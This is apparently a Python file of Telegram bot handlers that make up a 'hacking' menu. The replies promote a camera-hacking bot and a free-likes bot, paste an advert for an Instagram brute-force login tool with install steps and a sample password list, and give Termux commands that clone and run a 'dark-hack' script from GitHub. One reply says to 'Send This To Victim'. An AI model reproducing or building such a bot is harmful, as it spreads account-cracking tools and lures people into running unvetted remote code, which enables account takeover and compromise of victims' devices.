from telegram import Update
from telegram.ext import ContextTypes

async def camera_hacking(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.callback_query.edit_message_text("Click here to start the bot of Camera hacking @Prankstdbot")

async def free_instagram_likes(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.callback_query.edit_message_text("Get free 100 likes every day for free! Click here to start @InstagramLikeRoBot")

async def instagram_hacking(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.callback_query.edit_message_text(
        "✅ NEW INSTAGRAM BRUTE FORCE TOOL\n"
        "🔸🔸🔸🔸🔸🔸🔸🔸🔸🔸\n\n"
        "Insta-Breaker is a tool designed for automated login attempts on Instagram using a username and a file containing multiple passwords. It is intended for ethical use only, such as testing the security of your own Instagram account.\n\n"
        "💵 INSTALLATION\n\n"
        "$ pkg update\n"
        "$ pkg install python -y\n"
        "$ git clone https://github.com/GH05T-HUNTER5/insta-breaker\n"
        "$ cd insta-breaker\n"
        "$ bash install.sh\n"
        "$ insta-breaker\n\n"
        "The test password should be tested by adding your password on line one, two, three, or four.\n\n"
        "Password.txt\n\n"
        "18273939\n"
        "Iwieieie\n"
        "Iejdhdhd\n"
        "Your--pass\n"
        "Jajsndndn\n\n"
        "100% Working\n\n"
        "If this repository gets 5k likes, we will add more features such as:\n\n"
        "Enhanced protection mechanisms\n"
        "Automatic IP address addition"
    )

async def facebook_hacking(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.callback_query.edit_message_text(
        "Copy and paste these commands on Termux, Send This To Victim:\n\n"
        "`pkg update`\n"
        "`pkg upgrade`\n"
        "`pkg install git`\n"
        "`pkg openssh`\n"
        "`git clone https://github.com/Codot-ID/dark-hack`\n"
        "`cd dark-hack`\n"
        "`sh dark.sh`\n\n"
        "Enjoy hacking various platforms."
    )

async def whatsapp_hacking(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.callback_query.edit_message_text(
        "Copy and paste these commands on Termux:\n"
        "`pkg update`\n"
        "`pkg upgrade`\n"
        "`pkg install git`\n"
        "`pkg openssh`\n"
        "`git clone https://github.com/Codot-ID/dark-hack`\n"
        "`cd dark-hack`\n"
        "`sh dark.sh`\n\n"
        "Enjoy hacking various platforms."
    )

async def mendez_website(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.callback_query.edit_message_text("Enjoy more info about hacking from Mendez website 👉 https://mendez-website.vercel.app/")